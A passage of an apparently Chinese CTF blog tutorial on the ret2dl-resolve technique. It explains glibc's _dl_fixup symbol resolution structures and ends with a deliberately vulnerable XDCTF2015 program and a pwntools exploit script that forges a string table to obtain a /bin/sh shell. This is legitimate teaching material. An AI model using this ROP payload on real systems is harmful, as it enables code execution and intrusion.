RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">     <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中<code>_dl_fixup</code>会调用如下几个函数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup</span><br><span class="line">	-&gt;_dl_lookup_symbol_x</span><br><span class="line">    	-&gt;do_lookup_x</span><br><span class="line">    		-&gt;_dl_name_match_p</span><br><span class="line">    		-&gt;check_match</span><br></pre></td></tr></table></figure>
+<h3 id="传入参数"><a class="markdownIt-Anchor" href="#传入参数"></a> 传入参数</h3>
+<ul>
+<li>在调用<code>_dl_fixup</code>的时候会传入俩个参数，分别为<code>link_map *l</code>和<code>Elfw(Word) reloc_arg</code>，深入了解以下这俩个参数。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *<span class="number">1</span>,ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在正常的延迟绑定时，<code>link_map* l</code>其实就来自<code>got[1]</code></li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705200827021.png" alt="image-20250705200827021"></p>
+<ul>
+<li>而<code>reloc_arg</code>（重定位表索引）</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705200815390.png" alt="image-20250705200815390"></p>
+<ul>
+<li>这里重点介绍一下<code>link_map</code>这个结构体,在<code>glibc-2.23/elf/link.h</code>中可以找到</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">// 需要链接库的基地址</span></span><br><span class="line">    <span class="type">char</span> *l_name;			<span class="comment">// 文件路径名称例如libc.so.6 或者./a.out</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">// 是当前ELF文件的.dynamic段内存地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>ElfW(Dyn) *l_ld</code>这个地址其实就是在<code>IDA</code>中的这个位置，其实也就是<code>got[0]</code>的位置</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705202922541.png" alt="image-20250705202922541"></p>
+<ul>
+<li>而<code>ElfW(Dyn) *l_ld</code>这个段内存地址保存着很多下面这样的结构体。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">// 条目类型</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">// 整数值</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">// 地址值,比如表的地址偏移</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="comment">// d_tag的宏定义如下</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL		0		<span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED	1		<span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ	2		<span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT	3		<span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH		4		<span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB	5		<span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB	6		<span class="comment">/* Address of symbol table */</span></span></span><br><span class="line">....</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="重要过程与结构体"><a class="markdownIt-Anchor" href="#重要过程与结构体"></a> 重要过程与结构体</h3>
+<ul>
+<li>接下来就是<code>ret2dl-resolve</code>的关键点</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg</span></span><br><span class="line">	<span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span></span><br><span class="line">	assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为具体函数的地址</span></span><br><span class="line">	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">	<span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>首先是这个语句</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="comment">// 1.首先会从link_map这个结构体中取出 *l_ld</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">// 需要链接库的基地址</span></span><br><span class="line">    <span class="type">char</span> *l_name;			<span class="comment">// 文件路径名称例如libc.so.6 或者./a.out</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">// 是当前ELF文件的.dynamic段内存地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.找到当前ELF文件的.dynamic段内存地址,并且找到结构体Elf64_Dyn中tag=DT_JMPREL(即tag为0x17)也就是.rela.plt的位置</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">// 条目类型</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">// 整数值</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">// 地址值,比如表的地址偏移</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.地址值0x400438h这个就是一个.rela.plt数组记为rela_plt,加上之前push 0或者push 1偏移</span></span><br><span class="line">.rela.plt结构体如下</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* 存储着对应函数got表的地址*/</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* 重定位类型和符号表索引*/</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* 附加值 */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 说一这一句其实就是取对应的.rela.plt结构</span></span><br><span class="line">reloc = rela_plt[reloc_offset]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705210546200.png" alt="image-20250705210546200"></p>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705211116438.png" alt="image-20250705211116438"></p>
+<ul>
+<li>接下来这一句</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* 存储着对应函数got表的地址*/</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* 重定位类型和符号表索引*/</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* 附加值 */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="comment">// 从reloc中取出r_info这个结构体成员的值,这个成员的值高32位为符号表索引,低32位为重定位类型</span></span><br><span class="line">reloc-&gt;r_info</span><br><span class="line"><span class="comment">// 所以我们的这个ELFW(R_SYM)其实就是取r_info中高32位的值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="comment">// &amp;symtab这个其实记录在.dynamic中,如下图所示,它的地址为0x400288其对应的结构体是这样的</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Word      st_name;    <span class="comment">// 符号名称在字符串表中的偏移</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   st_info;    <span class="comment">// 符号类型 &amp; 符号绑定（压缩在一个字节中）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   st_other;   <span class="comment">// 保留字段（通常为 0）</span></span><br><span class="line">    Elf64_Half      st_shndx;   <span class="comment">// 该符号所在的节（section index）</span></span><br><span class="line">    Elf64_Addr      st_value;   <span class="comment">// 符号地址（如函数或变量地址）</span></span><br><span class="line">    Elf64_Xword     st_size;    <span class="comment">// 符号大小（如函数长度或变量大小）</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"><span class="comment">// 其实就是会指向的是symtab中的某个索引,即指向Elf64_Sym结构体</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705222833330.png" alt="image-20250705222833330"></p>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705223211616.png" alt="image-20250705223211616"></p>
+<ul>
+<li>接下来是做判断的，这里稍微注意一下即可</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接下来</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为具体函数的地址</span></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 首先strtab + sym -&gt; st_name会找到strtab中对应函数的字符串</span></span><br><span class="line"><span class="comment">// 其次得到read符号后,就会利用l这个在libc文件或其他库文件的结构体去libc文件中搜索偏移</span></span><br><span class="line"><span class="comment">// 最后返回 libcbase+read_offset即read_addr</span></span><br><span class="line"><span class="comment">// 所以result = read_addr</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705223527227.png" alt="image-20250705223527227"></p>
+<ul>
+<li>最后</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算符号的最终重定位值</span></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3>
+<ul>
+<li>经过对重要过程的分析，一般我们要利用<code>ret2dl-resolve</code>有如下几种思路：
+<ul>
+<li>能利用的有<code>_dl_fixup(struct link_map *1,ElfW(Word) reloc_arg)</code>中的<code>reloc_arg</code></li>
+<li>还可以<code>伪造某些结构体</code>，或者<code>修改某些结构体的值+伪造结构体</code></li>
+<li>伪造<code>link_map</code>这个结构体</li>
+</ul>
+</li>
+</ul>
+<h1 id="ret2dl-resolve"><a class="markdownIt-Anchor" href="#ret2dl-resolve"></a> ret2dl-resolve</h1>
+<ul>
+<li>注意：如果开启了<code>FULL_RELERO</code>就没办法利用<code>ret2dl-resolve</code>，因为<code>FULL_RELERO</code>会使得程序在执行前将这些库函数地址给解析完毕，因此<code>got</code>表中<code>got[1]</code>和<code>got[2]</code>中存储的值并不会被使用，所以<code>GOT</code>表中的这俩个地址均为<code>0</code>。</li>
+<li>其实<code>ret2dl-resolve</code>的基本思路就是我们通过栈溢出，先伪造出调用<code>_dl_runtime_resolve</code>需要传入的结构体，然后由攻击者调用<code>_dl_runtime_resolve</code>函数，从而修改指定函数的<code>got</code>表为<code>system</code>函数，最终达到<code>getshell</code>。</li>
+</ul>
+<h2 id="64位程序的利用"><a class="markdownIt-Anchor" href="#64位程序的利用"></a> 64位程序的利用</h2>
+<h3 id="no-relro情况例题"><a class="markdownIt-Anchor" href="#no-relro情况例题"></a> NO RELRO情况例题</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">	write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="comment">//gcc -fno-stack-protector -z norelro -no-pie rof.c -o norelro_x64</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>先来分析一下程序,<code>main</code>函数先输出<code>Welcome to XDCTF2015~!</code>，然后再进入<code>vuln</code>函数</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705230301674.png" alt="image-20250705230301674"></p>
+<ul>
+<li>之后查看<code>vuln</code>函数，这里存在栈溢出。</li>
+</ul>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705230347939.png" alt="image-20250705230347939"></p>
+<ul>
+<li>这题我们就采用<code>修改某些结构体的值+伪造结构体</code>，基本思路就是劫持<code>Elf64_Dyn</code>中的<code>d_un</code>成员，劫持到我们伪造的<code>Str_tabel</code>中，然后使用<code>ret</code>调用<code>_dl_runtime_resolve</code>对某个got表重新绑定，绑定成<code>system</code>函数的地址，之后再调用即可<code>system(&quot;/bin/sh&quot;)</code></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Word      st_name;    <span class="comment">// 符号名称在字符串表中的偏移</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   st_info;    <span class="comment">// 符号类型 &amp; 符号绑定（压缩在一个字节中）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   st_other;   <span class="comment">// 保留字段（通常为 0）</span></span><br><span class="line">    Elf64_Half      st_shndx;   <span class="comment">// 该符号所在的节（section index）</span></span><br><span class="line">    Elf64_Addr      st_value;   <span class="comment">// 符号地址（如函数或变量地址）</span></span><br><span class="line">    Elf64_Xword     st_size;    <span class="comment">// 符号大小（如函数长度或变量大小）</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用的关键语句如下:</span></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705230640517.png" alt="image-20250705230640517"></p>
+<p><img src="/2025/07/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/1.%E6%A0%88%E7%B3%BB%E5%88%97/ret2dlresolve/image-20250705231210248.png" alt="image-20250705231210248"></p>
+<ul>
+<li>首先我们来伪造一下</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./norelro_x64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./norelro_x64&#x27;</span>)</span><br><span class="line">bss_addr = <span class="number">0x600000</span> + <span class="number">0x500</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pop_rdi = <span class="number">0x400773</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400771</span></span><br><span class="line"><span class="comment"># DT_STRTAB.d_un_addr</span></span><br><span class="line">dt_strtab = <span class="number">0x600988</span></span><br><span class="line"><span class="comment"># 直接开始伪造</span></span><br><span class="line">fake = <span class="string">b&#x27;\x00libc.so.6\x00stdin\x00system\x00&#x27;</span></span><br><span class="line"><span class="comment"># 进行利用,先栈溢出修改地址,</span></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span> + p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(bss_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(read_plt)</span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(dt_strtab) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_plt)+p64(pop_rdi)+p64(bss_addr)	<span class="comment"># 由于在调用延迟绑定之后会直接调用一次System函数,所以先pop_rdi</span></span><br><span class="line">payload += p64(<span class="number">0x4004F6</span>) <span class="comment"># 0x4004F6为strlen@plt+6</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload1 = p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + fake</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="32位程序的利用"><a class="markdownIt-Anchor" href="#32位程序的利用"></a> 32位程序的利用</h2>
+<h1 id="相关题目"><a class="markdownIt-Anchor" href="#相关题目"></a> 相关题目</h1>
+<h2 id="64位程序"><a class="markdownIt-Anchor" href="#64位程序"></a> 64位程序</h2>
